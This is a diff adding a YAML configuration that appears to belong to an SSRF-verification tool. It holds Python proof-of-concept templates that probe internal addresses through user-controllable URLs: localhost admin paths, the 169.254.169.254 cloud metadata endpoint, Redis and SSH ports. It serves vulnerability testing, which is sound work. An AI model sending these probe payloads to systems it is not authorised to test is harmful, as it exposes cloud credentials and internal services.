@@ -1,0 +1,104 @@
+methods:
+  ssrf_resttemplate:
+    id: ssrf_resttemplate
+    name: RestTemplate SSRF 验证
+    vuln_type: ssrf
+    pattern: "RestTemplate"
+    confidence_level: high
+
+    validation:
+      type: code_analysis
+      steps:
+        - identify_resttemplate_usage
+        - trace_url_source
+        - check_url_validation
+        - test_internal_access
+
+    poc_template: |
+      def verify_ssrf_resttemplate(target_url):
+          """
+          验证 RestTemplate 是否存在 SSRF 风险
+
+          测试步骤:
+          1. 检查 URL 来源
+          2. 尝试访问内部资源
+          3. 检测 DNS 重绑定
+          """
+          test_urls = [
+              'http://localhost:8080/internal/admin',
+              'http://169.254.169.254/latest/meta-data/',
+              'http://internal.aws.ec2.metadata/',
+              'http://127.0.0.1:6379/',
+          ]
+
+          results = []
+          for url in test_urls:
+              try:
+                  response = send_request(url)
+                  if response.status_code in [200, 401, 403]:
+                      results.append({
+                          'url': url,
+                          'accessible': True,
+                          'internal': True
+                      })
+              except Exception:
+                  continue
+
+          return {
+              'is_exploitable': len(results) > 0,
+              'evidence': results
+          }
+
+    evidence_required:
+      - resttemplate_instance
+      - url_parameter
+
+  ssrf_url_controllable:
+    id: ssrf_url_controllable
+    name: URL 可控性 SSRF 验证
+    vuln_type: ssrf
+    pattern: "URL\\(|HttpClient|WebClient"
+    confidence_level: high
+
+    validation:
+      type: code_analysis
+      steps:
+        - identify_url_construction
+        - trace_user_input
+        - check_url_validation
+        - test_ssrf_exploitation
+
+    poc_template: |
+      def verify_url_controllable_ssrf(target, url_param):
+          """
+          验证 URL 参数是否可控导致 SSRF
+
+          测试步骤:
+          1. 识别 URL 参数来源
+          2. 尝试内网地址
+          3. 检测元数据端点访问
+          """
+          test_cases = [
+              {'url': 'http://localhost:22', 'description': 'SSH to localhost'},
+              {'url': 'http://169.254.169.254/', 'description': 'AWS metadata'},
+              {'url': 'http://internal.corp/', 'description': 'Internal network'},
+          ]
+
+          results = []
+          for test in test_cases:
+              payload = {url_param: test['url']}
+              response = send_request(target, **payload)
+              if response.status_code in [200, 401, 403]:
+                  results.append({
+                      'description': test['description'],
+                      'exploitable': True
+                  })
+
+          return {
+              'is_exploitable': len(results) > 0,
+              'evidence': results
+          }
+
+    evidence_required:
+      - url_construction
+      - parameter_source
